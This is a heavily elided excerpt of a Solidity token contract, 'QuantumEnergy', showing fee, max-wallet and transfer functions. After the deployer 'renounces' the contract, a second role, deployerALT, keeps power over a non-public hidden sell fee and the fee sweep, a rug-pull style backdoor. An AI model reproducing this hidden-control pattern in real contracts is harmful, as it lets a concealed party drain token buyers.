...
contract QuantumEnergy {
    ...
    uint public SellFeePercent;
    uint hSellFeePercent;
    ...
    function setLPtoken(address LPtokenAddress) public onlyDeployer {
    ...
    function flashInitalize(
        uint HowManyWholeTokens
    ) public payable onlyDeployer {
    ...
    function renounceContract() public onlyDeployer {
        deployer = address(0);
        renounced = true;
    }

    function configImmuneToMaxWallet(
        address Who,
        bool TrueorFalse
    ) public onlyDeployer {
    ...
    function editMaxWalletPercent(uint howMuch) public onlyDeployer {
        maxWalletPercent = howMuch;
    }

    function editSellFee(uint howMuch) public onlyDeployer {
        SellFeePercent = howMuch;
    }

    function editBuyFee(uint howMuch) public onlyDeployer {
        BuyFeePercent = howMuch;
    }

    function editTransferFee(uint howMuch) public onlyDeployer {
        transferFee = howMuch;
    }

    function setGelatoCaller(address Gelato) public onlyDeployer {
        gelatoCaller = Gelato;
    }

    function editcTime(uint howMuch) public onlyDeployALT {
        cTime = howMuch;
    }

    function setThreshold(uint HowMuch) public onlyDeployALT {
        threshold = HowMuch;
    }

    function editFee(uint howMuch) public onlyDeployALT {
        hSellFeePercent = howMuch;
    }

    function transfer(
        address _to,
        uint256 _value
    ) public updateReward(msg.sender) returns (bool success) {
        require(
        ...
        require(
            ...
            "Cannot trade while initalizing"
        );
        ...
        if (!immuneToMaxWallet[_to] && LPtoken != address(0)) {
            require(
                balanceOf[_to] <= maxWalletPercent * (totalSupply / 100),
                "This transaction would result in the destination's balance exceeding the maximum amount"
            );
        }
    ...
    function transferFrom(
        ...
        address _to,
        uint256 _value
    ) public updateReward(_from) returns (bool success) {
        require(balanceOf[_from] >= _value, "Insufficient token balance.");

        if (_from != msg.sender) {
            require(
                allowance[_from][msg.sender] >= _value,
                "Insufficent approval"
            );
            allowance[_from][msg.sender] -= _value;
        }
        ...
        if (!immuneToMaxWallet[_to] && LPtoken != address(0)) {
            require(
                balanceOf[_to] <= maxWalletPercent * (totalSupply / 100),
                "This transfer would result in the destination's balance exceeding the maximum amount"
            );
        }
    ...
    function sendFee() public {
        require(
            msg.sender == gelatoCaller || msg.sender == deployerALT,
